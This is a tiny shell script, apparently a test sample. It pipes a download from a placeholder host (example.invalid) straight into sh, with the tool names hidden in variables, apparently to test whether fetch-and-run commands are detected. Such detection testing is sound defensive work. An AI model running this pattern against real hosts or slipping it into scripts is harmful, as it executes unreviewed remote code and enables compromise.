#!/bin/sh
downloader=curl
runner=sh
$downloader https://example.invalid/FAKE-installer | $runner
